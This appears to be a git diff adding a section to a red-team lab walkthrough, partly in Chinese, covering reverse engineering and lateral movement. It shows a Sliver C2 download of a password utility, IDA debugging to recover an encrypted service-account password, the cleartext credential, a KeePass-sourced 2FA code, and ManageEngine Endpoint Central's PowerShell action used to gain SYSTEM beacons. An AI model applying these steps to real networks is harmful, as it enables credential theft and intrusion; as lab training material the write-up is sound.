@@ -716,3 +716,88 @@ WORK-JUNON\Hazel.Simpson
 
 ## <span style="color:lightblue">Reverse Engineering & Lateral Movement</span>
 
+```bash
+[server] sliver (wutai-http) > download SecurePass.exe
+
+[*] Wrote 144896 bytes (1 file successfully, 0 files unsuccessfully) to /home/kali/Desktop/SecurePass.exe
+```
+
+```
+C:\Users\redteam\Desktop>SecurePass.exe -p test
+SP714999519f07c2e8e456bb8b90d7f00af47afc240fdd828cc3fcf6cb5dcb1831
+
+C:\Users\redteam\Desktop>SecurePass.exe -p test
+SP74456250ea5eeb79645227b70b79a0c44ae189aed29eb200a85a8a04b8770ed7
+```
+
+```
+<securepass>
+    <username>svc_me</password>
+    <password>SP81274145f4a5857b839ee7b500f1d66e8a044d12211781b515e7bae67bb7abce</password>
+</securepass>
+```
+
+```
+IDA 启动
+
+main
+
+Debugger -> add Parameters (-p test)
+
+F2设置断点
+
+开始Debugger
+```
+
+```
+省略部分内容
+后续补PWN相关知识
+```
+
+```
+https://github.com/mmozeiko/aes-finder
+
+svc_me
+jYEp9bq32KFLVL!
+```
+
+```
+Description:
+Manage Engine Admin Account
+
+管理引擎管理员帐户
+
+https://172.16.21.195:8383/client#/login
+
+ManageEngine Endpoint Central 11
+
+桌面终端安全管理软件
+```
+
+```
+svc_me
+jYEp9bq32KFLVL!
+
+账号尝试admin 但是需要多因素验证
+Two Factor Authentication
+
+\\S021M015\it\vault\svc.kdbx
+
+KeePassXC是一个自由开源的密码管理器
+
+成功登进去 然后查看验证码
+
+成功登录ManageEngine Endpoint Central 11 面板
+```
+
+![](/assets/post_img/2023-11-03%20220353_Wutai_S021W105_UI.png)
+
+```
+导航到
+
+Actions
+System Manager
+PowerShell
+
+获取一个System beacon以及普通用户的beacon
+```
